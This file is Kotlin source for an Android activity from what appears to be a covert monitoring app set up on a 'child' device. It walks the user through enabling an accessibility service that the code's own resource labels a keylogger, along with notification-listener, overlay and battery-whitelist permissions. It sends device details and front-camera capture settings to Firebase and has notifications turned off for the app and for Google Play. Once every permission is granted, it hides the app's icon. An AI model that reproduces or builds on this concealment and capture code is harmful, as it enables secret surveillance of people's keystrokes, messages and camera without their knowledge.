package com.safe.setting.app.ui.activities.mainchild

import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.RelativeLayout
import android.widget.Toast
import androidx.appcompat.widget.SwitchCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat // **** नया इम्पोर्ट ****
import cn.pedant.SweetAlert.SweetAlertDialog
import com.google.firebase.database.DatabaseReference
import com.safe.setting.app.R
import com.safe.setting.app.data.model.ChildPhoto
import com.safe.setting.app.data.preference.DataSharePreference.childSelected
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.databinding.ActivityMainChildBinding
import com.safe.setting.app.services.accessibilityData.AccessibilityDataService
import com.safe.setting.app.ui.activities.base.BaseActivity
import com.safe.setting.app.utils.ConstFun.isAddWhitelist
import com.safe.setting.app.utils.ConstFun.isAndroidM
import com.safe.setting.app.utils.ConstFun.isNotificationServiceRunning
import com.safe.setting.app.utils.ConstFun.openAccessibilitySettings
import com.safe.setting.app.utils.ConstFun.openNotificationListenerSettings
import com.safe.setting.app.utils.ConstFun.openWhitelistSettings
import com.safe.setting.app.utils.ConstFun.showApp
import com.safe.setting.app.utils.Consts
import com.safe.setting.app.utils.async.AsyncTaskRunCommand
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.openDrawOverPermissionSetting
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.jaredrummler.android.device.DeviceName
import com.pawegio.kandroid.show
import io.reactivex.rxjava3.disposables.Disposable
import javax.inject.Inject

class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {

    // Views
    private lateinit var btnHideApp: Button
    private lateinit var btnEnableService: RelativeLayout
    private lateinit var btnEnableOverDraw: RelativeLayout
    private lateinit var btnEnableNotificationListener: RelativeLayout
    private lateinit var btnWhitelist: RelativeLayout
    private lateinit var btnAppNotificationSettings: RelativeLayout
    private lateinit var btnPlayStoreNotificationSettings: RelativeLayout

    private lateinit var switchOverDraw: SwitchCompat
    private lateinit var switchAccessibility: SwitchCompat
    private lateinit var switchNotificationListener: SwitchCompat
    private lateinit var switchWhitelist: SwitchCompat
    private lateinit var switchAppNotification: SwitchCompat
    private lateinit var switchPlayStoreNotification: SwitchCompat

    @Inject
    lateinit var firebase: InterfaceFirebase

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        initializeViews()
        getComponent()!!.inject(this)
        init()
        onClickApp()
    }

    private fun initializeViews() {
        // Views को बाइंड करें
        btnHideApp = binding.btnHideApp
        btnEnableService = binding.btnEnableService
        btnEnableNotificationListener = binding.btnEnableServiceNotification
        btnWhitelist = binding.btnAddWhitelist
        btnEnableOverDraw = binding.btnEnableOverdraw
        btnAppNotificationSettings = binding.btnAppNotificationSettings
        btnPlayStoreNotificationSettings = binding.btnPlaystoreNotificationSettings

        switchNotificationListener = binding.switchNotification
        switchOverDraw = binding.switchOverdraw
        switchWhitelist = binding.switchAddWhitelist
        switchAccessibility = binding.switchAccessibility
        switchAppNotification = binding.switchAppNotification
        switchPlayStoreNotification = binding.switchPlaystoreNotification
    }

    override fun instanceViewBinding(): ActivityMainChildBinding {
        return ActivityMainChildBinding.inflate(layoutInflater)
    }

    override fun onResume() {
        super.onResume()
        checkSwitchPermissions()
        updateNotificationSwitches()
    }

    override fun addDisposable(disposable: Disposable) {}

    private fun init() {
        getReference("${Consts.DATA}/${Consts.CHILD_SHOW_APP}").setValue(true)
        getReference("${Consts.DATA}/${Consts.CHILD_NAME}").setValue(childSelected)
        getReference("${Consts.DATA}/${Consts.DEVICE_NAME}").setValue(DeviceName.getDeviceName())
        val childPhoto = ChildPhoto(false, CameraFacing.FRONT_FACING_CAMERA)
        getReference("${Consts.PHOTO}/${Consts.PARAMS}").setValue(childPhoto)
        getReference("${Consts.PHOTO}/${Consts.CHILD_PERMISSION}").setValue(true)
    }

    private fun checkSwitchPermissions() {
        switchOverDraw.isChecked = canOverDrawOtherApps()
        switchAccessibility.isChecked = AccessibilityDataService.isRunningService
        switchNotificationListener.isChecked = isNotificationServiceRunning()
        if (isAndroidM()){
            switchWhitelist.isChecked = isAddWhitelist()
            btnWhitelist.show()
        }
    }

    private fun updateNotificationSwitches() {
        switchAppNotification.isChecked = !NotificationManagerCompat.from(this).areNotificationsEnabled()
        switchPlayStoreNotification.isChecked = getPlayStoreVisitedPreference()
    }

    private fun onClickApp() {
        // मौजूदा OnClickListeners...
        btnHideApp.setOnClickListener { checkPermissions() }
        btnEnableService.setOnClickListener {
            if (!AccessibilityDataService.isRunningService){
                dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_keylogger) { openAccessibilitySettings() }
            } else showMessage(R.string.already_activated)
        }
        btnEnableOverDraw.setOnClickListener {
            if (!canOverDrawOtherApps()){
                dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_overdraw) { openDrawOverPermissionSetting() }
            } else showMessage(R.string.already_activated)
        }
        btnEnableNotificationListener.setOnClickListener {
            if (!isNotificationServiceRunning()){
                openNotificationListenerSettings()
            } else showMessage(R.string.already_activated)
        }
        btnWhitelist.setOnClickListener {
            if (!isAddWhitelist()){
                openWhitelistSettings()
            } else showMessage(R.string.already_activated)
        }

        // नोटिफिकेशन बटनों के लिए OnClickListeners
        btnAppNotificationSettings.setOnClickListener {
            if (NotificationManagerCompat.from(this).areNotificationsEnabled()) {
                val dialogMessage = "You need to turn OFF notifications.\n\nAlso, if you see an 'Auto Start' or 'App launch' option in the same settings, please enable it.\n\nPress OK to continue."
                dialogWithString(SweetAlertDialog.NORMAL_TYPE, dialogMessage) {
                    openNotificationSettings(packageName)
                }
            } else {
                showMessage(R.string.already_activated)
            }
        }

        btnPlayStoreNotificationSettings.setOnClickListener {
            if (!getPlayStoreVisitedPreference()) {
                val dialogMessage = "You need to turn OFF notifications for Google Play products. Press OK to go to settings."
                dialogWithString(SweetAlertDialog.NORMAL_TYPE, dialogMessage) {
                    setPlayStoreVisitedPreference(true)
                    openNotificationSettings("com.android.vending")
                }
            } else {
                showMessage(R.string.already_activated)
            }
        }
    }

    private fun openNotificationSettings(targetPackageName: String) {
        try {
            val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                putExtra(Settings.EXTRA_APP_PACKAGE, targetPackageName)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
        } catch (e: ActivityNotFoundException) {
            Toast.makeText(this, "Could not open settings.", Toast.LENGTH_SHORT).show()
        }
    }

    private fun getReference(child: String): DatabaseReference = firebase.getDatabaseReference(child)

    private fun checkPermissions() {
        val appNotificationsOff = !NotificationManagerCompat.from(this).areNotificationsEnabled()
        val playStoreVisited = getPlayStoreVisitedPreference()

        if (canOverDrawOtherApps() && isNotificationServiceRunning() && AccessibilityDataService.isRunningService && isAddWhitelist() && appNotificationsOff && playStoreVisited) {
            // **** बदला हुआ कोड: प्रोग्रेस बार का रंग बदलें ****
            showDialog(SweetAlertDialog.PROGRESS_TYPE,R.string.hiding,null,null){
                progressHelper.barColor = ContextCompat.getColor(this@MainChildActivity, R.color.dark_accent)
                show()
            }
            showApp(false)
            getReference("${Consts.DATA}/${Consts.CHILD_SHOW_APP}").setValue(false)
        } else {
            dialog(SweetAlertDialog.NORMAL_TYPE, R.string.enable_all_permissions)
        }
    }

    private fun setPlayStoreVisitedPreference(visited: Boolean) {
        val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        prefs.edit().putBoolean("play_store_visited", visited).apply()
    }

    private fun getPlayStoreVisitedPreference(): Boolean {
        val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        return prefs.getBoolean("play_store_visited", false)
    }

    private fun activatePermissionRoot(command: String, showDialog: Boolean, activate: () -> Unit) {
        AsyncTaskRunCommand({
            // **** बदला हुआ कोड: प्रोग्रेस बार का रंग बदलें ****
            showDialog(SweetAlertDialog.PROGRESS_TYPE,R.string.activating,null,0){
                progressHelper.barColor = ContextCompat.getColor(this@MainChildActivity, R.color.dark_accent)
                show()
            }
        },{
            hideDialog()
            if (it){
                activate()
                if (showDialog) dialog(SweetAlertDialog.SUCCESS_TYPE,R.string.activated_success)
            }else dialog(SweetAlertDialog.ERROR_TYPE,R.string.failed_activate)
        }).execute(command)
    }

    private fun dialog(type: Int, msg: Int, action: (() -> Unit)? = null) {
        showDialog(type,R.string.title_dialog,getString(msg),android.R.string.ok){
            // **** बदला हुआ कोड: बटन का रंग बदलें ****
            confirmButtonBackgroundColor = ContextCompat.getColor(this@MainChildActivity, R.color.dark_accent)
            setConfirmClickListener { hideDialog() ; action?.invoke() } ; show()
        }
    }

    private fun dialogWithString(type: Int, message: String, action: (() -> Unit)? = null) {
        showDialog(type, R.string.title_dialog, message, android.R.string.ok) {
            // **** बदला हुआ कोड: बटन का रंग बदलें ****
            confirmButtonBackgroundColor = ContextCompat.getColor(this@MainChildActivity, R.color.dark_accent)
            setConfirmClickListener { hideDialog() ; action?.invoke() } ; show()
        }
    }

    override fun onDestroy() {
        hideDialog()
        super.onDestroy()
    }
}